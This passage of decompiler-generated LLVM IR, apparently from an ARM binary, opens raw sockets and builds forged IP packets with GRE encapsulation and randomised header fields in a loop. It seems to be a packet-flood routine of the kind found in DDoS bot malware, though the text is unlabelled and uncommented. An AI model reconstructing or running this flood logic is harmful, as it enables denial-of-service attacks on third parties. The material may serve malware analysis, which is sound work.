  %v6_89fc = inttoptr i32 %v0_89e8 to i32*
  %v7_89fc = call i32 @function_8570(i32 %v0_89f4, i32* %v6_89fc, i32 5, i32 1, i32 %v1_89e4)
  %v1_8a08 = urem i32 %v7_89fc, 256
  store i32 %v1_8a08, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_8a14 = load i32, i32* @r5, align 4
  store i32 %v0_8a14, i32* %r1.global-to-local, align 4
  %v0_8a18 = load i32, i32* @r4, align 4
  store i32 %v0_8a18, i32* %r0.global-to-local, align 4
  %v5_8a20 = inttoptr i32 %v0_8a14 to i32*
  %v6_8a20 = call i32 @function_8570(i32 %v0_8a18, i32* %v5_8a20, i32 6, i32 65535, i32 %v1_8a08)
  %v0_8a28 = load i32, i32* @r5, align 4
  store i32 %v0_8a28, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_8a20, i32* @r8, align 4
  %v0_8a38 = load i32, i32* @r4, align 4
  store i32 %v0_8a38, i32* %r0.global-to-local, align 4
  %v5_8a3c = inttoptr i32 %v0_8a28 to i32*
  %v6_8a3c = call i32 @function_8570(i32 %v0_8a38, i32* %v5_8a3c, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_8a40 = load i32, i32* @r5, align 4
  store i32 %v0_8a40, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_8a3c, i32* @r7, align 4
  %v0_8a50 = load i32, i32* @r4, align 4
  store i32 %v0_8a50, i32* %r0.global-to-local, align 4
  %v5_8a54 = inttoptr i32 %v0_8a40 to i32*
  %v6_8a54 = call i32 @function_8570(i32 %v0_8a50, i32* %v5_8a54, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8a64 = load i32, i32* @r5, align 4
  store i32 %v0_8a64, i32* %r1.global-to-local, align 4
  %v0_8a68 = load i32, i32* @r4, align 4
  store i32 %v0_8a68, i32* %r0.global-to-local, align 4
  %v5_8a6c = inttoptr i32 %v0_8a64 to i32*
  %v6_8a6c = call i32 @function_8570(i32 %v0_8a68, i32* %v5_8a6c, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_8a74 = urem i32 %v6_8a6c, 256
  store i32 %v1_8a74, i32* %ip.global-to-local, align 4
  %v0_8a78 = load i32, i32* @r5, align 4
  store i32 %v0_8a78, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8a84 = load i32, i32* @r4, align 4
  store i32 %v0_8a84, i32* %r0.global-to-local, align 4
  %v5_8a8c = inttoptr i32 %v0_8a78 to i32*
  %v6_8a8c = call i32 @function_8570(i32 %v0_8a84, i32* %v5_8a8c, i32 19, i32 0, i32 %v1_8a74)
  %v0_8a94 = load i32, i32* @r5, align 4
  store i32 %v0_8a94, i32* %r1.global-to-local, align 4
  %v2_8a98 = load i32, i32* @global_var_20a4c.46, align 4
  store i32 %v2_8a98, i32* %r3.global-to-local, align 4
  store i32 %v6_8a8c, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_8aa4 = load i32, i32* @r4, align 4
  store i32 %v0_8aa4, i32* %r0.global-to-local, align 4
  %v5_8aa8 = inttoptr i32 %v0_8a94 to i32*
  %v6_8aa8 = call i32 @function_8570(i32 %v0_8aa4, i32* %v5_8aa8, i32 25, i32 %v2_8a98, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_8abc = call i32 @function_115e4(i32 2, i32 3, i32 6)
  store i32 %v3_8abc, i32* %r0.global-to-local, align 4
  %v7_8ac0 = icmp eq i32 %v3_8abc, -1
  store i1 %v7_8ac0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8ac0, label %dec_label_pc_8fd4, label %dec_label_pc_8acc

dec_label_pc_8acc:                                ; preds = %dec_label_pc_896c
  store i32 1, i32* %stack_var_-44, align 4
  %v6_8ad4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_8ad4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_8ae8 = call i32 @function_115a0(i32 %v3_8abc, i32 0, i32 3, i32 %v6_8ad4, i32 4)
  store i32 %v5_8ae8, i32* %r0.global-to-local, align 4
  %v7_8aec = icmp eq i32 %v5_8ae8, -1
  store i1 %v7_8aec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8aec, label %dec_label_pc_8fcc, label %dec_label_pc_8af4

dec_label_pc_8af4:                                ; preds = %dec_label_pc_8acc
  %v0_8af4 = load i32, i32* @r8, align 4
  %v0_8af8 = load i32, i32* @r7, align 4
  %v0_8afc = load i32, i32* %fp.global-to-local, align 4
  %v0_8b00 = load i32, i32* @r6, align 4
  %v1_8b00 = urem i32 %v0_8b00, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_8b08 = urem i32 %v0_8af4, 65536
  store i32 %v3_8b08, i32* %r3.global-to-local, align 4
  %v3_8b0c = urem i32 %v0_8af8, 65536
  store i32 %v3_8b0c, i32* %r4.global-to-local, align 4
  %v0_8b10 = load i32, i32* @sl, align 4
  %v2_8b10 = icmp eq i32 %v0_8b10, 0
  store i1 %v2_8b10, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_8b28 = urem i32 %v0_8afc, 65536
  store i32 %v3_8b28, i32* @fp, align 4
  br i1 %v2_8b10, label %dec_label_pc_8fe0, label %dec_label_pc_8b38

dec_label_pc_8b38:                                ; preds = %dec_label_pc_8af4
  %v3_8af8 = mul i32 %v0_8af8, 65536
  %v3_8af4 = mul i32 %v0_8af4, 65536
  %v0_8afc.not = or i32 %v0_8afc, -65536
  %v1_8b3c = xor i32 %v0_8afc.not, 65535
  %v3_8b40 = mul i32 %v6_8a54, 65536
  %v1_8b44 = add i32 %v3_8b40, 4325376
  %tmp73 = udiv i32 %v1_8b44, 256
  %v3_8b58 = and i32 %tmp73, 65280
  %tmp74 = mul nsw i32 %v1_8b3c, 256
  %v3_8b5c = and i32 %tmp74, 65280
  store i32 %v3_8b5c, i32* %ip.global-to-local, align 4
  %v1_8b60 = add i32 %v3_8b40, 524288
  %v1_8b68 = add i32 %v3_8b40, 1835008
  %tmp75 = udiv i32 %v1_8b3c, 256
  %v4_8b6c = urem i32 %tmp75, 256
  %v5_8b6c = or i32 %v4_8b6c, %v3_8b5c
  %v4_8b74 = udiv i32 %v1_8b44, 16777216
  %v5_8b74 = or i32 %v3_8b58, %v4_8b74
  store i32 %v5_8b74, i32* @r8, align 4
  %v3_8b80 = udiv i32 %v1_8b68, 256
  %tmp76 = mul i32 %v0_8afc, 256
  %v3_8b84 = and i32 %tmp76, 65280
  store i32 %v3_8af4, i32* %r2.global-to-local, align 4
  %tmp77 = udiv i32 %v0_8afc, 256
  %v4_8b94 = urem i32 %tmp77, 256
  %v5_8b94 = or i32 %v4_8b94, %v3_8b84
  store i32 %v5_8b94, i32* %r0.global-to-local, align 4
  %tmp78 = mul i32 %v0_8af4, 256
  %v3_8b98 = and i32 %tmp78, 65280
  %v1_8b9c = and i32 %v3_8b80, 65280
  store i32 %v1_8b9c, i32* @r6, align 4
  store i32 %v3_8af8, i32* %r1.global-to-local, align 4
  %tmp79 = mul i32 %v0_8af8, 256
  %v3_8ba8 = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v0_8af4, 256
  %v4_8bac = urem i32 %tmp80, 256
  %v5_8bac = or i32 %v4_8bac, %v3_8b98
  store i32 %v5_8bac, i32* @lr, align 4
  %v4_8bb0 = udiv i32 %v1_8b68, 16777216
  %v5_8bb0 = or i32 %v1_8b9c, %v4_8bb0
  store i32 %v5_8bb0, i32* %r3.global-to-local, align 4
  %tmp81 = udiv i32 %v0_8af8, 256
  %v4_8bb4 = urem i32 %tmp81, 256
  %v5_8bb4 = or i32 %v4_8bb4, %v3_8ba8
  %tmp82 = udiv i32 %v1_8b60, 256
  %v3_8bb8 = and i32 %tmp82, 65280
  store i32 %v3_8bb8, i32* @r5, align 4
  %v5_8bbc = trunc i32 %v5_8b94 to i16
  %v5_8bc4 = trunc i32 %v5_8bb0 to i16
  %v4_8bcc = udiv i32 %v1_8b60, 16777216
  %v5_8bcc = or i32 %v3_8bb8, %v4_8bcc
  store i32 %v5_8bcc, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v1_8c34 = trunc i32 %v6_89dc to i8
  %sext = mul nuw i32 %v5_8b6c, 65536
  %v4_8cc0 = sdiv i32 %sext, 65536
  %v2_8cec = icmp eq i32 %v1_8b00, 0
  %sext8 = mul nuw i32 %v5_8bac, 65536
  %v4_8d0c = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_8bb4, 65536
  %v4_8d14 = sdiv i32 %sext9, 65536
  %v1_8ccc27 = trunc i32 %v4_8cc0 to i16
  br label %dec_label_pc_8bd4

dec_label_pc_8bd4:                                ; preds = %bb85, %dec_label_pc_8b38
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_8be0 = call i32 @function_1214c(i32 1510, i32 4)
  store i32 %v2_8be0, i32* %r0.global-to-local, align 4
  %v2_8be8 = load i32, i32* @r4, align 4
  %v5_8be8 = mul i32 %v2_8be8, 4
  %v6_8be8 = add i32 %v5_8be8, %v2_8988
  %v7_8be8 = inttoptr i32 %v6_8be8 to i32*
  store i32 %v2_8be0, i32* %v7_8be8, align 4
  %v3_8bec = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8bec, i32* %r2.global-to-local, align 4
  %v5_8bf4 = mul i32 %v3_8bec, 24
  %v1_8bf8 = load i32, i32* @sb, align 4
  %v2_8bf8 = add i32 %v1_8bf8, %v5_8bf4
  store i32 %v2_8bf8, i32* @lr, align 4
  store i32 %v2_8988, i32* %r3.global-to-local, align 4
  %v4_8c00 = mul i32 %v3_8bec, 4
  %v5_8c00 = add i32 %v4_8c00, %v2_8988
  %v6_8c00 = inttoptr i32 %v5_8c00 to i32*
  %v7_8c00 = load i32, i32* %v6_8c00, align 4
  store i32 %v7_8c00, i32* %r4.global-to-local, align 4
  %v1_8c04 = inttoptr i32 %v7_8c00 to i8*
  %v2_8c04 = load i8, i8* %v1_8c04, align 1
  %tmp = urem i8 %v2_8c04, 16
  %v1_8c08 = zext i8 %tmp to i32
  %v1_8c0c = or i32 %v1_8c08, 64
  store i32 %v1_8c0c, i32* %r3.global-to-local, align 4
  %v1_8c10 = trunc i32 %v1_8c0c to i8
  store i8 %v1_8c10, i8* %v1_8c04, align 1
  %v0_8c14 = load i32, i32* %r4.global-to-local, align 4
  %v1_8c14 = inttoptr i32 %v0_8c14 to i8*
  %v2_8c14 = load i8, i8* %v1_8c14, align 1
  %v1_8c18 = and i8 %v2_8c14, -16
  %v1_8c1c = or i8 %v1_8c18, 5
  store i32 %v1_8a08, i32* %r5.global-to-local, align 4
  store i8 %v1_8c1c, i8* %v1_8c14, align 1
  store i32 %v6_89a0, i32* %r1.global-to-local, align 4
  %v2_8c2c = load i32, i32* %r4.global-to-local, align 4
  %v3_8c2c = add i32 %v2_8c2c, 1
  %v4_8c2c = inttoptr i32 %v3_8c2c to i8*
  store i8 %v5_89c0, i8* %v4_8c2c, align 1
  store i32 %v1_89e4, i32* %r2.global-to-local, align 4
  %v2_8c34 = load i32, i32* %r4.global-to-local, align 4
  %v3_8c34 = add i32 %v2_8c34, 8
  %v4_8c34 = inttoptr i32 %v3_8c34 to i8*
  store i8 %v1_8c34, i8* %v4_8c34, align 1
  %v2_8c3c = load i32, i32* %r4.global-to-local, align 4
  %v3_8c3c = add i32 %v2_8c3c, 4
  %v4_8c3c = inttoptr i32 %v3_8c3c to i16*
  store i16 %v5_8bbc, i16* %v4_8c3c, align 2
  %v2_8c44 = load i32, i32* %r4.global-to-local, align 4
  %v3_8c44 = add i32 %v2_8c44, 9
  %v4_8c44 = inttoptr i32 %v3_8c44 to i8*
  store i8 47, i8* %v4_8c44, align 1
  store i32 %v6_8aa8, i32* %r3.global-to-local, align 4
  %v0_8c4c = load i32, i32* %r5.global-to-local, align 4
  %v2_8c4c = icmp eq i32 %v0_8c4c, 0
  store i1 %v2_8c4c, i1* %cpsr_z.global-to-local, align 1
  %v1_8c50 = load i32, i32* %r4.global-to-local, align 4
  %v2_8c50 = add i32 %v1_8c50, 12
  %v3_8c50 = inttoptr i32 %v2_8c50 to i32*
  store i32 %v6_8aa8, i32* %v3_8c50, align 4
  br i1 %v2_8c4c, label %.thread25, label %bb

bb:                                               ; preds = %dec_label_pc_8bd4
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_8c58 = load i32, i32* %r4.global-to-local, align 4
  %v4_8c58 = add i32 %v3_8c58, 6
  %v5_8c58 = inttoptr i32 %v4_8c58 to i16*
  store i16 64, i16* %v5_8c58, align 2
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_8bd4, %bb
  %v0_8c5c = load i32, i32* @lr, align 4
  %v1_8c5c = add i32 %v0_8c5c, 16
  %v2_8c5c = inttoptr i32 %v1_8c5c to i32*
  %v3_8c5c = load i32, i32* %v2_8c5c, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_8c64 = load i32, i32* %r4.global-to-local, align 4
  %v2_8c64 = add i32 %v1_8c64, 16
  %v3_8c64 = inttoptr i32 %v2_8c64 to i32*
  store i32 %v3_8c5c, i32* %v3_8c64, align 4
  %v0_8c68 = load i32, i32* %r4.global-to-local, align 4
  %v1_8c68 = add i32 %v0_8c68, 24
  store i32 %v1_8c68, i32* %r1.global-to-local, align 4
  %v1_8c6c = add i32 %v0_8c68, 20
  store i32 %v1_8c6c, i32* %r0.global-to-local, align 4
  %v0_8c70 = load i32, i32* %ip.global-to-local, align 4
  %v1_8c70 = add i32 %v0_8c70, 101
  store i32 %v1_8c70, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_8c7c = load i32, i32* @r8, align 4
  %v1_8c7c = trunc i32 %v0_8c7c to i16
  %v3_8c7c = add i32 %v0_8c68, 2
  %v4_8c7c = inttoptr i32 %v3_8c7c to i16*
  store i16 %v1_8c7c, i16* %v4_8c7c, align 2
  %v0_8c80 = load i32, i32* %ip.global-to-local, align 4
  %v1_8c80 = trunc i32 %v0_8c80 to i16
  %v2_8c80 = load i32, i32* %r0.global-to-local, align 4
  %v3_8c80 = add i32 %v2_8c80, 2
  %v4_8c80 = inttoptr i32 %v3_8c80 to i16*
  store i16 %v1_8c80, i16* %v4_8c80, align 2
  %v0_8c84 = load i32, i32* %r3.global-to-local, align 4
  %v1_8c84 = trunc i32 %v0_8c84 to i8
  %v2_8c84 = load i32, i32* %r1.global-to-local, align 4
  %v3_8c84 = add i32 %v2_8c84, 13
  %v4_8c84 = inttoptr i32 %v3_8c84 to i8*
  store i8 %v1_8c84, i8* %v4_8c84, align 1
  %v0_8c88 = load i32, i32* %r2.global-to-local, align 4
  %v1_8c88 = trunc i32 %v0_8c88 to i8
  %v2_8c88 = load i32, i32* %r1.global-to-local, align 4
  %v3_8c88 = add i32 %v2_8c88, 12
  %v4_8c88 = inttoptr i32 %v3_8c88 to i8*
  store i8 %v1_8c88, i8* %v4_8c88, align 1
  %v0_8c8c = load i32, i32* %r4.global-to-local, align 4
  %v1_8c8c = add i32 %v0_8c8c, 38
  %v2_8c8c = inttoptr i32 %v1_8c8c to i8*
  %v3_8c8c = load i8, i8* %v2_8c8c, align 1
  %tmp89 = urem i8 %v3_8c8c, 16
  %v1_8c90 = zext i8 %tmp89 to i32
  %v1_8c94 = or i32 %v1_8c90, 64
  store i32 %v1_8c94, i32* %r3.global-to-local, align 4
  %v1_8c98 = trunc i32 %v1_8c94 to i8
  store i8 %v1_8c98, i8* %v2_8c8c, align 1
  %v0_8c9c = load i32, i32* %r4.global-to-local, align 4
  %v1_8c9c = add i32 %v0_8c9c, 38
  %v2_8c9c = inttoptr i32 %v1_8c9c to i8*
  %v3_8c9c = load i8, i8* %v2_8c9c, align 1
  %v1_8ca0 = and i8 %v3_8c9c, -16
  %v1_8ca4 = or i8 %v1_8ca0, 5
  store i8 %v1_8ca4, i8* %v2_8c9c, align 1
  %v0_8cb0 = load i32, i32* %r4.global-to-local, align 4
  %v1_8cb0 = add i32 %v0_8cb0, 38
  store i32 %v1_8cb0, i32* @r5, align 4
  %v3_8cb4 = add i32 %v0_8cb0, 39
  %v4_8cb4 = inttoptr i32 %v3_8cb4 to i8*
  store i8 %v5_89c0, i8* %v4_8cb4, align 1
  store i32 %v5_8bb0, i32* %r2.global-to-local, align 4
  %v2_8cbc = load i32, i32* @r5, align 4
  %v3_8cbc = add i32 %v2_8cbc, 2
  %v4_8cbc = inttoptr i32 %v3_8cbc to i16*
  store i16 %v5_8bc4, i16* %v4_8cbc, align 2
  store i32 %v4_8cc0, i32* %r3.global-to-local, align 4
  store i32 %v1_89e4, i32* %r1.global-to-local, align 4
  %v0_8cc8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8cc8, label %.thread26, label %bb83

.thread26:                                        ; preds = %.thread25
  %v2_8ccc28 = load i32, i32* @r5, align 4
  %v3_8ccc29 = add i32 %v2_8ccc28, 4
  %v4_8ccc30 = inttoptr i32 %v3_8ccc29 to i16*
  store i16 %v1_8ccc27, i16* %v4_8ccc30, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb84

bb83:                                             ; preds = %.thread25
  store i32 64, i32* %r2.global-to-local, align 4
  %v2_8ccc = load i32, i32* @r5, align 4
  %v3_8ccc = add i32 %v2_8ccc, 4
  %v4_8ccc = inttoptr i32 %v3_8ccc to i16*
  store i16 %v1_8ccc27, i16* %v4_8ccc, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  %v1_8cd4 = load i32, i32* %r2.global-to-local, align 4
  %v2_8cd4 = trunc i32 %v1_8cd4 to i16
  %v3_8cd4 = load i32, i32* @r5, align 4
  %v4_8cd4 = add i32 %v3_8cd4, 6
  %v5_8cd4 = inttoptr i32 %v4_8cd4 to i16*
  store i16 %v2_8cd4, i16* %v5_8cd4, align 2
  br label %bb84

bb84:                                             ; preds = %.thread26, %bb83
  %v0_8cd8 = load i32, i32* %r1.global-to-local, align 4
  %v1_8cd8 = trunc i32 %v0_8cd8 to i8
  %v2_8cd8 = load i32, i32* @r5, align 4
  %v3_8cd8 = add i32 %v2_8cd8, 8
  %v4_8cd8 = inttoptr i32 %v3_8cd8 to i8*
  store i8 %v1_8cd8, i8* %v4_8cd8, align 1
  %v0_8cdc = load i32, i32* %r3.global-to-local, align 4
  %v1_8cdc = trunc i32 %v0_8cdc to i8
  %v2_8cdc = load i32, i32* @r5, align 4
  %v3_8cdc = add i32 %v2_8cdc, 9
  %v4_8cdc = inttoptr i32 %v3_8cdc to i8*
  store i8 %v1_8cdc, i8* %v4_8cdc, align 1
  %v0_8ce0 = call i32 @function_e0b4()
  store i32 %v0_8ce0, i32* %r0.global-to-local, align 4
  store i32 %v1_8b00, i32* %r1.global-to-local, align 4
  store i1 %v2_8cec, i1* %cpsr_z.global-to-local, align 1
  %v1_8cf0 = sub i32 1023, %v0_8ce0
  store i32 %v1_8cf0, i32* %r3.global-to-local, align 4
  br i1 %v2_8cec, label %.thread, label %.thread10

.thread:                                          ; preds = %bb84
  %v2_8cf8 = load i32, i32* @r5, align 4
  %v3_8cf8 = add i32 %v2_8cf8, 16
  %v4_8cf8 = inttoptr i32 %v3_8cf8 to i32*
  store i32 %v1_8cf0, i32* %v4_8cf8, align 4
  br label %bb85

.thread10:                                        ; preds = %bb84
  %v1_8cf4 = load i32, i32* %r4.global-to-local, align 4
  %v2_8cf4 = add i32 %v1_8cf4, 16
  %v3_8cf4 = inttoptr i32 %v2_8cf4 to i32*
  %v4_8cf4 = load i32, i32* %v3_8cf4, align 4
  store i32 %v4_8cf4, i32* %r3.global-to-local, align 4
  %v2_8cfc = load i32, i32* @r5, align 4
  %v3_8cfc = add i32 %v2_8cfc, 16
  %v4_8cfc = inttoptr i32 %v3_8cfc to i32*
  store i32 %v4_8cf4, i32* %v4_8cfc, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %.thread10
  %v1_8d00 = load i32, i32* @r5, align 4
  %v2_8d00 = add i32 %v1_8d00, 12
  %v3_8d00 = inttoptr i32 %v2_8d00 to i32*
  store i32 %v0_8ce0, i32* %v3_8d00, align 4
  %v3_8d04 = load i32, i32* %stack_var_-44, align 4
  %v0_8d08 = load i32, i32* %r4.global-to-local, align 4
  %v1_8d08 = add i32 %v0_8d08, 58
  store i32 %v1_8d08, i32* @r6, align 4
  store i32 %v4_8d0c, i32* %r2.global-to-local, align 4
  %v1_8d10 = add i32 %v3_8d04, 1
  store i32 %v1_8d10, i32* @r4, align 4
  store i32 %v4_8d14, i32* %r3.global-to-local, align 4
  %v1_8d18 = load i32, i32* @sl, align 4
  %v9_8d18 = icmp eq i32 %v1_8d10, %v1_8d18
  store i1 %v9_8d18, i1* %cpsr_z.global-to-local, align 1
  %v0_8d1c = load i32, i32* @r7, align 4
  %v1_8d1c = trunc i32 %v0_8d1c to i16
  %v3_8d1c = add i32 %v0_8d08, 62
  %v4_8d1c = inttoptr i32 %v3_8d1c to i16*
  store i16 %v1_8d1c, i16* %v4_8d1c, align 2
  %v0_8d20 = load i32, i32* %r2.global-to-local, align 4
  %v1_8d20 = trunc i32 %v0_8d20 to i16
  %v2_8d20 = load i32, i32* @r6, align 4
  %v3_8d20 = inttoptr i32 %v2_8d20 to i16*
  store i16 %v1_8d20, i16* %v3_8d20, align 2
  %v0_8d24 = load i32, i32* %r3.global-to-local, align 4
  %v1_8d24 = trunc i32 %v0_8d24 to i16
  %v2_8d24 = load i32, i32* @r6, align 4
  %v3_8d24 = add i32 %v2_8d24, 2
  %v4_8d24 = inttoptr i32 %v3_8d24 to i16*
  store i16 %v1_8d24, i16* %v4_8d24, align 2
  %v0_8d28 = load i32, i32* @r4, align 4
  store i32 %v0_8d28, i32* %stack_var_-44, align 4
  %v5_8d2c = icmp slt i32 %v1_8d10, %v1_8d18
  br i1 %v5_8d2c, label %dec_label_pc_8bd4, label %dec_label_pc_8d30

dec_label_pc_8d30:                                ; preds = %bb85
  %v1_8d38 = add i32 %v6_8a54, 8
  store i32 %v1_8d38, i32* %r4.global-to-local, align 4
  %v1_8d3c = add i32 %v6_8a54, 66
  store i32 %v1_8d3c, i32* %r5.global-to-local, align 4
  %v0_8d4c.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_8d48.preheader

dec_label_pc_8d48.preheader:                      ; preds = %dec_label_pc_8d30, %dec_label_pc_8fe0
  %v0_8d4c.pre = phi i32 [ %v0_8d4c.pre.pre, %dec_label_pc_8d30 ], [ 0, %dec_label_pc_8fe0 ]
  %stack_var_-132.0.ph = phi i32 [ %v1_8d3c, %dec_label_pc_8d30 ], [ %v1_8fec, %dec_label_pc_8fe0 ]
  %stack_var_-136.0.ph = phi i32 [ %v1_8d38, %dec_label_pc_8d30 ], [ %v1_8fe8, %dec_label_pc_8fe0 ]
  %v2_8f9c = icmp eq i32 %v1_8b00, 0
  %v2_8de4 = ptrtoint i32* %stack_var_-48 to i32
  %v2_8dfc = ptrtoint i32* %stack_var_-52 to i32
  %v2_8e0c = ptrtoint i32* %stack_var_-56 to i32
  %v2_8e18 = ptrtoint i32* %stack_var_-54 to i32
  %v2_8e2c = icmp eq i32 %v1_8a74, 0
  %v2_8d8c = icmp eq i32 %v6_8aa8, -1
  %v7_8d8c = icmp eq i32 %v6_8aa8, -1
  br label %dec_label_pc_8d48

dec_label_pc_8d48:                                ; preds = %dec_label_pc_8d48, %dec_label_pc_8e34, %dec_label_pc_8d48.preheader
  %v0_8d4c = phi i32 [ %v0_8d4c.pre, %dec_label_pc_8d48.preheader ], [ 0, %dec_label_pc_8d48 ], [ %v1_8ed0, %dec_label_pc_8e34 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_8d4c = icmp eq i32 %v0_8d4c, 0
  store i1 %v2_8d4c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_8d4c, label %dec_label_pc_8d48, label %dec_label_pc_8d58

dec_label_pc_8d58:                                ; preds = %dec_label_pc_8d48
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8d5c

dec_label_pc_8d5c:                                ; preds = %dec_label_pc_8e34, %dec_label_pc_8d58
  %v1_8d70 = phi i32 [ %v1_8ecc, %dec_label_pc_8e34 ], [ 0, %dec_label_pc_8d58 ]
  %v5_8d60 = mul i32 %v1_8d70, 24
  %v1_8d64 = load i32, i32* @sb, align 4
  %v2_8d64 = add i32 %v1_8d64, %v5_8d60
  store i32 %v2_8d64, i32* %r3.global-to-local, align 4
  store i32 %v2_8988, i32* %r4.global-to-local, align 4
  %v1_8d6c = add i32 %v2_8d64, 20
  %v2_8d6c = inttoptr i32 %v1_8d6c to i8*
  %v3_8d6c = load i8, i8* %v2_8d6c, align 1
  %v4_8d6c = zext i8 %v3_8d6c to i32
  store i32 %v4_8d6c, i32* %r2.global-to-local, align 4
  %v4_8d70 = mul i32 %v1_8d70, 4
  %v5_8d70 = add i32 %v4_8d70, %v2_8988
  %v6_8d70 = inttoptr i32 %v5_8d70 to i32*
  %v7_8d70 = load i32, i32* %v6_8d70, align 4
  store i32 %v7_8d70, i32* @r5, align 4
  %v7_8d74 = icmp eq i8 %v3_8d6c, 31
  store i1 %v7_8d74, i1* %cpsr_z.global-to-local, align 1
  %v1_8d78 = add i32 %v7_8d70, 24
  store i32 %v1_8d78, i32* @r7, align 4
  %v1_8d7c = add i32 %v7_8d70, 38
  store i32 %v1_8d7c, i32* @r6, align 4
  %v1_8d80 = add i32 %v7_8d70, 58
  store i32 %v1_8d80, i32* @r8, align 4
  %tmp90 = icmp ult i8 %v3_8d6c, 32
  br i1 %tmp90, label %dec_label_pc_8ee0, label %dec_label_pc_8d88

dec_label_pc_8d88:                                ; preds = %dec_label_pc_8d5c
  store i32 %v6_8aa8, i32* %r1.global-to-local, align 4
  store i1 %v7_8d8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8d8c, label %dec_label_pc_8f40, label %dec_label_pc_8d94

dec_label_pc_8d94:                                ; preds = %dec_label_pc_8ee0, %dec_label_pc_8d88
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_8d9c = load i32, i32* @fp, align 4
  %v9_8d9c = icmp eq i32 %v0_8d9c, 65535
  store i1 %v9_8d9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8d9c, label %dec_label_pc_8f58, label %dec_label_pc_8da4

dec_label_pc_8da4:                                ; preds = %dec_label_pc_8f40.dec_label_pc_8da4_crit_edge, %dec_label_pc_8d94
  %v1_8da8 = phi i32 [ %v1_8da8.pre, %dec_label_pc_8f40.dec_label_pc_8da4_crit_edge ], [ 65535, %dec_label_pc_8d94 ]
  store i32 %v3_8b08, i32* %r2.global-to-local, align 4
  %v9_8da8 = icmp eq i32 %v3_8b08, %v1_8da8
  store i1 %v9_8da8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8da8, label %dec_label_pc_8f80, label %dec_label_pc_8db0

dec_label_pc_8db0:                                ; preds = %dec_label_pc_8f58.dec_label_pc_8db0_crit_edge, %dec_label_pc_8da4
  %v1_8db4 = phi i32 [ %v1_8db4.pre, %dec_label_pc_8f58.dec_label_pc_8db0_crit_edge ], [ %v1_8da8, %dec_label_pc_8da4 ]
  store i32 %v3_8b0c, i32* %r3.global-to-local, align 4
  %v9_8db4 = icmp eq i32 %v3_8b0c, %v1_8db4
  store i1 %v9_8db4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8db4, label %dec_label_pc_8f94, label %dec_label_pc_8dbc

dec_label_pc_8dbc:                                ; preds = %dec_label_pc_8f80, %dec_label_pc_8db0
  store i32 %v1_8b00, i32* @r4, align 4
  store i1 %v2_8f9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8f9c, label %dec_label_pc_8fb0, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_8dbc
  %v1_8dc4 = load i32, i32* @r5, align 4
  %v2_8dc4 = add i32 %v1_8dc4, 16
  %v3_8dc4 = inttoptr i32 %v2_8dc4 to i32*
  %v4_8dc4 = load i32, i32* %v3_8dc4, align 4
  store i32 %v4_8dc4, i32* %r3.global-to-local, align 4
  %v2_8dc8 = load i32, i32* @r6, align 4
  %v3_8dc8 = add i32 %v2_8dc8, 16
  %v4_8dc8 = inttoptr i32 %v3_8dc8 to i32*
  store i32 %v4_8dc4, i32* %v4_8dc8, align 4
  br label %dec_label_pc_8dd0

dec_label_pc_8dd0:                                ; preds = %bb88, %.thread11, %dec_label_pc_8fb0
  %v0_8dd0 = call i32 @function_e0b4()
  store i32 %v0_8dd0, i32* %r0.global-to-local, align 4
  store i32 %v0_8dd0, i32* %stack_var_-48, align 4
  %v0_8dd8 = call i32 @function_e0b4()
  store i32 %v0_8dd8, i32* %r0.global-to-local, align 4
  store i32 %v0_8dd8, i32* %stack_var_-52, align 4
  %v0_8de0 = call i32 @function_e0b4()
